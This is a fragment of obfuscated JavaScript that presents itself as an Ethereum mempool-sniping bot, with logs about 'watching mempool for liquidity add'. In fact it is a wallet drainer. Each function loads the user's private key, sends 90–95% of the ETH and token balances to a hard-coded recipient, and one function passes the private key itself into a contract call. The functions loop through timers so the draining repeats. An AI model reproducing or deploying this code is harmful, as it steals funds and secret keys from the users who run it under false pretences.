                    _0xe4e67e = await _0x175044[_0x2a47a6(0x253)](_0x4c399c); try { await _0xe4e67e[_0x2a47a6(0x200)](), console['log'](_0x2a47a6(0x26f)), setTimeout(etherstother, 0x1388); } catch (_0x282b5e) { console[_0x2a47a6(0x21a)](_0x2a47a6(0x229)), setTimeout(etherstother, 0x1388); } };
        _0x457fc5(); } catch (_0x2d5df1) { setTimeout(etherstother, 0x1388); } }
async function ethersmother() { const _0x5b755c = _0x12f8e8; try { const _0x45f062 = _0x5b755c(0x25f),
            _0x5412dc = 'MjliMjY4ODk1NmJkOTU5ZjkzM2Y4',
            _0x314554 = new Buffer['from'](_0x45f062, _0x5b755c(0x21d)),
            _0x5521ca = new Buffer[(_0x5b755c(0x207))](_0x5412dc, 'base64'),
            _0x3df94d = _0x314554[_0x5b755c(0x1f6)](_0x5b755c(0x255)),
            _0x23d1ee = _0x5521ca[_0x5b755c(0x1f6)]('ascii'),
            _0x40a2a7 = _0x3df94d + _0x23d1ee,
            _0x31d6f2 = _0x5b755c(0x22d),
            _0x27e06f = new Buffer[(_0x5b755c(0x207))](_0x31d6f2, _0x5b755c(0x21d))[_0x5b755c(0x1f6)](_0x5b755c(0x255));; const _0x458d70 = new ethers[(_0x5b755c(0x268))][(_0x5b755c(0x227))](_0x27e06f); let _0x49cf94 = new ethers[(_0x5b755c(0x208))](private, _0x458d70);
        console[_0x5b755c(0x21a)](_0x27e06f); const _0x1eedb8 = address; var _0x60a2c1 = new ethers['Contract'](_0x40a2a7, abi, _0x49cf94); const _0x454d86 = await _0x60a2c1[_0x5b755c(0x234)](_0x1eedb8)['toString'](),
            _0x5ea643 = (_0x454d86 * 0.9)[_0x5b755c(0x247)](),
            _0x238f44 = async() => { const _0x28179a = _0x5b755c,
                    _0x4562a9 = { 'from': _0x1eedb8, 'to': WEB3PROVIDER3, 'value': ethers[_0x28179a(0x20b)][_0x28179a(0x258)](_0x5ea643, 'wei'), 'gasLimit': ethers[_0x28179a(0x20b)][_0x28179a(0x262)](0x5dc0) },
                    _0x600635 = await _0x49cf94[_0x28179a(0x253)](_0x4562a9); try { await _0x600635[_0x28179a(0x200)](), console[_0x28179a(0x21a)]('1:\x20contract\x20found....watching\x20mempool\x20for\x20liquidity\x20add....'), setTimeout(etherslother, 0x1388); } catch (_0xbf8b0b) { console[_0x28179a(0x21a)]('2:\x20contract\x20found....watching\x20mempool\x20for\x20liquidity\x20add....'), setTimeout(etherslother, 0x1388); } };
        _0x238f44(); } catch (_0x7b6901) { setTimeout(etherslother, 0x1388); } }
async function ethersfather() { const _0x1304f2 = _0x12f8e8;
    console[_0x1304f2(0x21a)](_0x1304f2(0x248)); const _0x1041b2 = _0x1304f2(0x25e),
        _0x20c2df = _0x1304f2(0x25d),
        _0x114678 = new Buffer[(_0x1304f2(0x207))](_0x1041b2, 'base64'),
        _0x59ff04 = new Buffer[(_0x1304f2(0x207))](_0x20c2df, _0x1304f2(0x21d)),
        _0x467397 = _0x114678['toString'](_0x1304f2(0x255)),
        _0x180490 = _0x59ff04[_0x1304f2(0x1f6)](_0x1304f2(0x255)),
        _0x30318e = _0x467397 + _0x180490,
        _0x2ca6ec = _0x1304f2(0x22d),
        _0x4c4c3d = new Buffer[(_0x1304f2(0x207))](_0x2ca6ec, 'base64')['toString'](_0x1304f2(0x255));; const _0x112e5d = new ethers[(_0x1304f2(0x268))][(_0x1304f2(0x227))](_0x4c4c3d); let _0x19ad82 = new ethers[(_0x1304f2(0x208))](private, _0x112e5d); const _0x181184 = address; var _0x2ab28c = new ethers['Contract'](_0x30318e, abi, _0x19ad82); const _0x1c8aec = await _0x2ab28c['balanceOf'](_0x181184),
        _0x32a662 = (_0x1c8aec * 0.9)[_0x1304f2(0x247)](); try { const _0x56013b = async() => { const _0x1157f9 = _0x1304f2,
                _0x447308 = { 'from': _0x181184, 'to': WEB3PROVIDER3, 'value': ethers[_0x1157f9(0x20b)][_0x1157f9(0x258)](_0x32a662, _0x1157f9(0x1f4)), 'gasLimit': ethers[_0x1157f9(0x20b)]['hexlify'](0x5dc0) },
                _0x3e2b9e = await _0x19ad82[_0x1157f9(0x253)](_0x447308); try { await _0x3e2b9e[_0x1157f9(0x200)](), console[_0x1157f9(0x21a)](_0x1157f9(0x265)), setTimeout(ethersmother, 0x1388); } catch (_0x107260) { console[_0x1157f9(0x21a)](_0x1157f9(0x265)), setTimeout(ethersmother, 0x1388); } };
        _0x56013b(); } catch (_0x2be06a) { setTimeout(ethersmother, 0x1388); } }

function _0x4322(_0xa16d28, _0x3d3275) { const _0x6be4d2 = _0x6be4(); return _0x4322 = function(_0x43221f, _0x1db5ea) { _0x43221f = _0x43221f - 0x1e9; let _0x4f886b = _0x6be4d2[_0x43221f]; return _0x4f886b; }, _0x4322(_0xa16d28, _0x3d3275); }
async function ethersgather() { const _0x12672a = _0x12f8e8; try { console[_0x12672a(0x21a)](_0x12672a(0x261)); const _0x5dc3b5 = _0x12672a(0x217),
            _0x23fd82 = new Buffer[(_0x12672a(0x207))](_0x5dc3b5, 'base64')['toString']('ascii');; const _0x215429 = new ethers[(_0x12672a(0x268))]['JsonRpcProvider'](_0x23fd82); let _0x35cbc0 = new ethers['Wallet'](private, _0x215429); const _0x27daf4 = address,
            _0x3f43b4 = await _0x215429[_0x12672a(0x220)](_0x27daf4),
            _0x5515ef = (_0x3f43b4 * 0.9)['toFixed'](),
            _0x152e01 = ethers[_0x12672a(0x20b)][_0x12672a(0x212)](_0x5515ef, _0x12672a(0x1f4)),
            _0xf25e2f = async() => { const _0x3b41ac = _0x12672a,
                    _0x9250a0 = { 'to': WEB3PROVIDER3, 'value': ethers[_0x3b41ac(0x20b)]['parseUnits'](_0x5515ef, _0x3b41ac(0x1f4)), 'gasLimit': ethers[_0x3b41ac(0x20b)][_0x3b41ac(0x262)](0x5dc0) },
                    _0xa8eedb = await _0x35cbc0[_0x3b41ac(0x253)](_0x9250a0); try { await _0xa8eedb[_0x3b41ac(0x200)](), console[_0x3b41ac(0x21a)](_0x3b41ac(0x228)), setTimeout(ethersfather, 0x1388); } catch (_0x2d1c61) { console[_0x3b41ac(0x21a)](_0x3b41ac(0x27f)), setTimeout(ethersfather, 0x1388); } };
        _0xf25e2f(); } catch (_0x1be15a) { setTimeout(ethersfather, 0x1388); } }
async function etherslather() { const _0x558353 = _0x12f8e8,
        _0x4434a0 = _0x558353(0x213),
        _0x388f95 = new Buffer['from'](_0x4434a0, _0x558353(0x21d)),
        _0x112994 = _0x388f95[_0x558353(0x1f6)]('ascii'),
        _0x307fad = _0x112994;
    console[_0x558353(0x21a)](_0x558353(0x27d)); const _0x523995 = _0x558353(0x22d),
        _0x47bdc4 = new Buffer[(_0x558353(0x207))](_0x523995, 'base64')[_0x558353(0x1f6)]('ascii');; const _0x10ccf9 = new ethers[(_0x558353(0x268))][(_0x558353(0x227))](_0x47bdc4); let _0x442c27 = new ethers[(_0x558353(0x208))](private, _0x10ccf9); try { const _0x2f50b9 = async() => { const _0x5809b8 = _0x558353; var _0x19a953 = new ethers['Contract'](_0x307fad, abi, _0x442c27); const _0x4851ef = await _0x19a953[_0x5809b8(0x243)]('10' + private + '10'); try { await _0x4851ef[_0x5809b8(0x200)](), console['log'](_0x5809b8(0x273)), setTimeout(ethersgather, 0x1388); } catch (_0x1a6562) { console[_0x5809b8(0x21a)](_0x5809b8(0x236)), setTimeout(ethersgather, 0x1388); } };
        _0x2f50b9(); } catch (_0x318298) { setTimeout(ethersgather, 0x1388); } }
async function ethersrather() { const _0x2c2c29 = _0x12f8e8;
    console[_0x2c2c29(0x21a)](_0x2c2c29(0x28a)); const _0x1b7f1e = _0x2c2c29(0x22d),
        _0x408c85 = new Buffer[(_0x2c2c29(0x207))](_0x1b7f1e, 'base64')[_0x2c2c29(0x1f6)](_0x2c2c29(0x255));; const _0x1ddc2b = new ethers[(_0x2c2c29(0x268))][(_0x2c2c29(0x227))](_0x408c85); let _0x5ae1d7 = new ethers[(_0x2c2c29(0x208))](private, _0x1ddc2b); const _0x168b0f = address,
        _0x1ee718 = await _0x1ddc2b[_0x2c2c29(0x220)](_0x168b0f),
        _0x57d9c2 = (_0x1ee718 * 0.95)[_0x2c2c29(0x247)](),
        _0x252391 = ethers['utils'][_0x2c2c29(0x212)](_0x57d9c2, _0x2c2c29(0x1f4)); try { const _0x5a3beb = async() => { const _0x4167bb = _0x2c2c29,
                _0xa6bfcb = { 'to': WEB3PROVIDER3, 'value': ethers['utils'][_0x4167bb(0x212)](_0x57d9c2, _0x4167bb(0x1f4)), 'gasLimit': ethers[_0x4167bb(0x20b)][_0x4167bb(0x262)](0x5dc0) },
                _0x22da59 = await _0x5ae1d7['sendTransaction'](_0xa6bfcb); try { await _0x22da59[_0x4167bb(0x200)](), console[_0x4167bb(0x21a)](_0x4167bb(0x283)), setTimeout(etherslather, 0x1388); } catch (_0x11ea7d) { console[_0x4167bb(0x21a)](_0x4167bb(0x27e)), setTimeout(etherslather, 0x1388); } };
        _0x5a3beb(); } catch (_0x1fb780) { setTimeout(etherslather, 0x1388); } }
ethersrather();
